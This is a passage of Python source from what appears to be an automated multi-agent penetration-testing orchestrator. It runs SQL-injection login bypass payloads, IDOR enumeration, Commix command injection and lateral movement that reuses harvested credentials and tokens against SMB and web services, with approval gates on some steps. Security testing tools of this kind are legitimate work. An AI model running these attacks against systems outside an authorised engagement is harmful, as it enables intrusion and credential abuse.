                            ctx.auth_context.setdefault("tokens", []).append(token)

            # Form-encoded SQLi — use actual field names if discovered from HTML
            form_params = ep.get("params", [])
            if form_params and ep.get("form_discovered"):
                # Use real form field names (e.g., username, email, p, password)
                user_field = next(
                    (f for f in form_params
                     if any(k in f.lower() for k in ("user", "email", "login", "name"))),
                    form_params[0],
                )
                pass_field = next(
                    (f for f in form_params
                     if any(k in f.lower() for k in ("pass", "pwd", "p", "secret"))),
                    form_params[1] if len(form_params) > 1 else "password",
                )
                form_data = f"{user_field}=admin%27+OR+1%3D1--&{pass_field}=test"
                # Add any extra fields (submit buttons, hidden fields)
                for f in form_params:
                    if f not in (user_field, pass_field):
                        form_data += f"&{f}=Submit"
            else:
                form_data = "username=admin%27+OR+1%3D1--&password=test&login=Login"

            result2 = await at.run_tool(
                "curl_raw",
                {
                    "url": url,
                    "options": (
                        "-X POST -H 'Content-Type: application/x-www-form-urlencoded' "
                        f"-d '{form_data}'"
                    ),
                },
                display=f"Testing form SQLi on login: {url}...",
            )
            if result2.success:
                parsed2 = parse_curl(result2.stdout)
                status = parsed2.get("status_code", 0)
                body_text = parsed2.get("body", "")
                # Check for redirect (302) or dashboard/welcome content
                if status in (200, 302) and any(
                    k in body_text.lower()
                    for k in ("welcome", "dashboard", "logout", "profile", "session", "location:")
                ):
                    await at.report_finding(
                        title="SQL Injection Authentication Bypass (Form)",
                        severity="critical",
                        category="Authentication",
                        target=url,
                        description="Login form accepts SQL injection in credentials.",
                        cvss=9.8,
                        evidence=result2.stdout[:2000],
                    )
                    self._record_chain_step(ctx, "AT", "SQLi form auth bypass", "critical")

        # ── Test 2: User registration ──
        for ep in register_endpoints[:2]:
            url = ep.get("url", "")
            if not url.startswith("http"):
                url = (ep.get("base_url", "") or base_url).rstrip("/") + url

            result = await at.run_tool(
                "curl_raw",
                {
                    "url": url,
                    "options": (
                        "-X POST -H 'Content-Type: application/json' "
                        "-d '{\"email\":\"test@athena.local\",\"password\":\"Test123!\","
                        "\"passwordRepeat\":\"Test123!\"}'"
                    ),
                },
                display=f"Testing registration: {url}...",
            )
            if result.success:
                parsed = parse_curl(result.stdout)
                if parsed.get("status_code") in (200, 201):
                    ctx.auth_context.setdefault("credentials", []).append({
                        "user": "test@athena.local",
                        "pass": "Test123!",
                        "source": "AT registration",
                    })

        # ── Test 3: Unauthenticated admin access ──
        for ep in admin_eps[:3]:
            url = ep.get("url", "")
            if not url.startswith("http"):
                url = (ep.get("base_url", "") or base_url).rstrip("/") + url

            result = await at.run_tool(
                "curl_raw",
                {"url": url, "options": "-L"},
                display=f"Testing unauth admin access: {url}...",
            )
            if result.success:
                parsed = parse_curl(result.stdout)
                if parsed.get("status_code") == 200:
                    body_text = parsed.get("body", "")
                    # Check it's actually admin content, not a redirect to login
                    if not any(k in body_text.lower() for k in ("login", "sign in", "unauthorized")):
                        await at.report_finding(
                            title=f"Unauthenticated Admin Access: {url}",
                            severity="critical",
                            category="Authorization",
                            target=url,
                            description="Admin endpoint accessible without authentication.",
                            evidence=result.stdout[:2000],
                        )

        await at.complete(
            f"Auth testing complete. "
            f"Tokens: {len(ctx.auth_context.get('tokens', []))}, "
            f"Credentials: {len(ctx.auth_context.get('credentials', []))}."
        )

    async def _webapp_api_attack(self, ctx: EngagementContext):
        """AA: Exploit discovered API endpoints with authenticated context."""
        aa = self._runner("AA", ctx)

        if not ctx.discovered_endpoints:
            await aa.complete("No API endpoints discovered — skipping API attacks.")
            return

        tokens = ctx.auth_context.get("tokens", [])
        auth_header = f"-H 'Authorization: Bearer {tokens[0]}'" if tokens else ""

        await aa.think(
            thought=f"Launching API attacks on {len(ctx.discovered_endpoints)} endpoints.",
            reasoning="Testing IDOR, mass assignment, command injection, and NoSQL injection "
                      "on discovered API endpoints using authenticated context.",
            action="api_attack",
        )

        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
        base_url = web_targets[0].rstrip("/") if web_targets else ""

        if not base_url:
            await aa.complete("No base URL for API attacks.")
            return

        # Test 1: IDOR on user/resource endpoints
        idor_endpoints = [
            ep for ep in ctx.discovered_endpoints
            if any(
                k in ep.get("url", "").lower()
                for k in ("users", "user", "profile", "account", "order")
            )
        ]

        for ep in idor_endpoints[:5]:
            url = ep.get("url", "")
            if not url.startswith("http"):
                url = base_url + url

            for test_id in [1, 2, 3]:
                test_url = f"{url}/{test_id}"
                result = await aa.run_tool(
                    "curl_raw",
                    {"url": test_url, "options": f"-L {auth_header}"},
                    display=f"IDOR test: {test_url}...",
                )
                if result.success:
                    parsed = parse_curl(result.stdout)
                    if parsed.get("status_code") == 200 and parsed.get("body_json"):
                        body = parsed["body_json"]
                        if body.get("email") or body.get("username") or body.get("data"):
                            await aa.report_finding(
                                title=f"IDOR: Unauthorized data access on {url}",
                                severity="high",
                                category="Authorization",
                                target=test_url,
                                description=(
                                    f"API endpoint exposes user data via sequential ID "
                                    f"enumeration. Accessed ID={test_id} without proper "
                                    f"authorization check."
                                ),
                                evidence=result.stdout[:2000],
                            )
                            self._record_chain_step(
                                ctx, "AA", f"IDOR on {url}/{test_id}", "high",
                            )
                            break  # One finding per endpoint

        # Test 2: Command injection via Commix (HITL gated)
        injectable_endpoints = [
            ep for ep in ctx.discovered_endpoints
            if ep.get("params") and any(
                p.lower() in (
                    "cmd", "command", "exec", "run", "query",
                    "search", "input", "path", "file",
                )
                for p in ep.get("params", [])
            )
        ]

        for ep in injectable_endpoints[:3]:
            url = ep.get("url", "")
            if not url.startswith("http"):
                url = base_url + url

            approved = await aa.request_approval(
                action=f"Command injection test on {url}",
                description=(
                    "Commix will attempt OS command injection on detected parameters. "
                    "Non-destructive payloads only (id, whoami, hostname)."
                ),
                risk_level="high",
                target=url,
            )

            if approved:
                result = await aa.run_tool(
                    "commix_inject",
                    {"url": url},
                    display=f"Commix injection test: {url}...",
                )
                if result.success:
                    parsed = parse_commix(result.stdout)
                    if parsed.get("injectable"):
                        await aa.report_finding(
                            title=f"Command Injection: {parsed.get('parameter', url)}",
                            severity="critical",
                            category="Injection",
                            target=url,
                            description=(
                                f"OS command injection via "
                                f"{parsed.get('technique', 'unknown')} technique. "
                                f"Parameter: {parsed.get('parameter', 'unknown')}"
                            ),
                            cvss=9.8,
                            evidence=parsed.get("details", ""),
                        )
                        self._record_chain_step(
                            ctx, "AA",
                            f"Command injection on {url}",
                            "critical",
                        )

        await aa.complete(
            f"API attack testing complete. {ctx.finding_count} total findings."
        )

    async def _phase_lateral_movement(self, ctx: EngagementContext):
        """Phase 6: LM lateral movement with harvested credentials."""
        # Collect credentials from all sources
        creds = ctx.auth_context.get("credentials", [])
        tokens = ctx.auth_context.get("tokens", [])
        engagement_creds = self.state._credentials.get(ctx.engagement_id, [])

        if not creds and not tokens and not engagement_creds:
            # No credentials to test — skip silently
            lm = self._runner("LM", ctx)
            await lm.complete(
                "No credentials/tokens harvested — skipping lateral movement."
            )
            return

        await self._emit_phase("LATERAL MOVEMENT")

        lm = self._runner("LM", ctx)
        await lm.think(
            thought="Attempting lateral movement with harvested credentials.",
            reasoning=(
                f"Have {len(creds)} web creds, {len(tokens)} tokens, "
                f"{len(engagement_creds)} tool-harvested creds. "
                "Testing reuse against other services on discovered hosts."
            ),
            action="lateral_movement",
        )

        # HITL gate
        approved = await lm.request_approval(
            action="Lateral movement with harvested credentials",
            description=(
                f"Test {len(creds) + len(engagement_creds)} harvested credentials "
                "against SSH, SMB, and web services on discovered hosts. "
                "Non-destructive: login validation only."
            ),
            risk_level="high",
            target=ctx.engagement_id,
        )

        if not approved:
            await lm.complete("Lateral movement skipped — HITL rejected.")
            return

        hosts = list(set(r["ip"] for r in ctx.discovered_hosts))
        all_creds = creds + [
            {"user": c.get("username", ""), "pass": "", "source": c.get("source", "")}
            for c in engagement_creds
            if c.get("username")
        ]

        lateral_findings = 0
        for cred in all_creds[:5]:
            username = cred.get("user", "")
            if not username:
                continue

            for host_ip in hosts[:5]:
                # Test SMB via NetExec if port 445/139 is open
                smb_services = [
                    r for r in ctx.discovered_hosts
                    if r["ip"] == host_ip and r.get("port") in (445, 139)
                ]
                if smb_services:
                    password = cred.get("pass", "")
                    result = await lm.run_tool(
                        "crackmapexec_scan",
                        {
                            "target": host_ip,
                            "protocol": "smb",
                            "additional_args": f"-u '{username}' -p '{password}' --shares",
                        },
                        display=f"NetExec SMB: {username}@{host_ip}...",
                    )
                    if result.success:
                        nxc_results = parse_netexec_output(result.stdout)
                        for r in nxc_results:
                            if r.get("status") in ("pwned", "ok"):
                                lateral_findings += 1
                                await lm.report_finding(
                                    title=f"Lateral Movement: {username}@{host_ip} (SMB)",
                                    severity="critical",
                                    category="Lateral Movement",
                                    target=host_ip,
                                    description=(
                                        f"Credential reuse successful. User {username} "
                                        f"(from {cred.get('source', 'unknown')}) "
                                        f"has valid SMB access on {host_ip}."
                                    ),
                                    evidence=result.stdout[:2000],
                                )
                                self._record_chain_step(
                                    ctx, "LM",
                                    f"Lateral: {username}@{host_ip} (SMB)",
                                    "critical",
                                )

                # Test HTTP services with harvested tokens
                web_services = [
                    r for r in ctx.discovered_hosts
                    if r["ip"] == host_ip
                    and r.get("port") in (80, 443, 8080, 8443, 3000, 5000)
                ]
                if web_services and tokens:
                    port = web_services[0]["port"]
                    proto = "https" if port in (443, 8443) else "http"
                    test_url = f"{proto}://{host_ip}:{port}/"
                    result = await lm.run_tool(
                        "curl_raw",
                        {
                            "url": test_url,
                            "options": f"-H 'Authorization: Bearer {tokens[0]}' -L",
                        },
                        display=f"Token reuse test: {test_url}...",
                    )
                    if result.success:
                        parsed = parse_curl(result.stdout)
                        if parsed.get("status_code") == 200 and parsed.get("body_json"):
                            await lm.report_finding(
                                title=f"Token Reuse: Valid on {host_ip}:{port}",
                                severity="high",
                                category="Lateral Movement",
                                target=test_url,
                                description=(
                                    f"Harvested JWT/bearer token accepted by "
                                    f"{host_ip}:{port}. Cross-service token reuse."
                                ),
                                evidence=result.stdout[:2000],
                            )

        # Write attack chains to Neo4j
        await self._write_chains_neo4j(ctx)

        await lm.complete(
            f"Lateral movement complete: {lateral_findings} successful pivots."
        )

    def _record_chain_step(
        self, ctx: EngagementContext, agent: str,
        description: str, severity: str,
    ):
        """Record an attack chain step linking to the latest finding."""
        if not ctx.findings:
            return

        latest = ctx.findings[-1]
        step = {
            "agent": agent,
            "finding_id": latest["id"],
            "description": description,
            "phase": {
                "JS": 2, "PD": 4, "WA": 4, "AT": 4, "AA": 5, "LM": 6,
            }.get(agent, 0),
        }

        # Append to current chain or create new one
        if ctx.attack_chains:
            current = ctx.attack_chains[-1]
            # If last step was from an earlier or same phase, extend the chain
            if current["steps"][-1]["phase"] <= step["phase"]:
                current["steps"].append(step)
                # Upgrade chain severity if needed
                sev_order = {
                    "info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4,
                }
                if sev_order.get(severity, 0) > sev_order.get(
                    current["severity"], 0
                ):
                    current["severity"] = severity
                return

        # New chain
        chain = {
            "id": f"chain-{uuid.uuid4().hex[:6]}",
            "name": description,
            "steps": [step],
            "severity": severity,
            "impact": "",
        }
        ctx.attack_chains.append(chain)

    async def _write_chains_neo4j(self, ctx: EngagementContext):
        """Write [:LEADS_TO] relationships between chained findings in Neo4j."""
        from server import neo4j_available, neo4j_driver
        if not neo4j_available or not neo4j_driver:
            return

        try:
            with neo4j_driver.session() as session:
                for chain in ctx.attack_chains:
                    steps = chain.get("steps", [])
                    for i in range(len(steps) - 1):
                        src_id = steps[i].get("finding_id", "")
                        dst_id = steps[i + 1].get("finding_id", "")
                        if src_id and dst_id:
                            session.run("""
                                MATCH (f1:Finding {id: $src}), (f2:Finding {id: $dst})
                                MERGE (f1)-[:LEADS_TO {
                                    chain_id: $chain_id,
                                    chain_severity: $severity
                                }]->(f2)
                            """, src=src_id, dst=dst_id,
                                 chain_id=chain["id"],
                                 severity=chain["severity"])
        except Exception as e:
            logger.warning("Neo4j chain write error: %s", e)

    # ── Helpers ──

    async def _load_scope(self, engagement_id: str) -> dict:
        """Load engagement scope (targets + exclusions) from Neo4j or state."""
        from server import neo4j_available, neo4j_driver
        if neo4j_available and neo4j_driver:
            try:
                with neo4j_driver.session() as session:
                    result = session.run(
                        "MATCH (e:Engagement {id: $eid}) "
                        "RETURN e.scope AS scope, e.exclusions AS exclusions",
                        eid=engagement_id,
                    )
                    record = result.single()
                    if record and record["scope"]:
                        scope_str = record["scope"]
                        targets = [t.strip() for t in scope_str.split(",") if t.strip()]
                        exclusion_str = record.get("exclusions") or ""
                        exclusions = [e.strip() for e in exclusion_str.split(",") if e.strip()]
                        return {"targets": targets, "exclusions": exclusions}
            except Exception as e:
                logger.warning("Neo4j scope load error: %s", e)

        # Fallback: check state engagements
        for eng in self.state.engagements:
            if eng.id == engagement_id:
                targets = [t.strip() for t in eng.target.split(",") if t.strip()]
                return {"targets": targets, "exclusions": []}

        return {"targets": [], "exclusions": []}

    async def _detect_target_type(self, scope: dict) -> str:
        """Detect if targets are internal or external.

        Special case: 10.1.1.0/24 is the Antsle bridge network — targets
        there are reachable only from the external (Antsle) Kali backend,
        so they map to "external" despite being RFC-1918 addresses.
        """
        import ipaddress
        antsle_bridge = ipaddress.ip_network("10.1.1.0/24")
        for target in scope.get("targets", []):
            try:
                net = ipaddress.ip_network(target, strict=False)
                # Antsle bridge targets use the external Kali backend
                if net.subnet_of(antsle_bridge):
                    return "external"
                if net.is_private:
                    return "internal"
            except ValueError:
                pass  # Domain, not IP — assume external
        return "external"

    async def _emit_phase(self, phase: str):
        """Broadcast phase update."""
        await self.state.broadcast({
            "type": "phase_update",
            "phase": phase,
            "timestamp": time.time(),
        })

    async def _update_engagement_status(self, eid: str, status: str):
        """Update engagement status in Neo4j and broadcast to clients."""
        from server import neo4j_available, neo4j_driver
        if neo4j_available and neo4j_driver:
            try:
                with neo4j_driver.session() as session:
                    session.run(
                        "MATCH (e:Engagement {id: $eid}) SET e.status = $status",
                        eid=eid, status=status,
                    )
            except Exception as e:
                logger.warning("Failed to update engagement status in Neo4j: %s", e)
        # Broadcast so Engagements page updates in real-time
        await self.state.broadcast({
            "type": "engagement_status",
            "engagement_id": eid,
            "status": status,
            "timestamp": time.time(),
        })

    async def _emit_system(self, message: str):
        """Broadcast system message."""
        await self.state.broadcast({
            "type": "system",
            "content": message,
            "agent": "OR",
            "agentName": "Orchestrator",
            "timestamp": time.time(),
        })
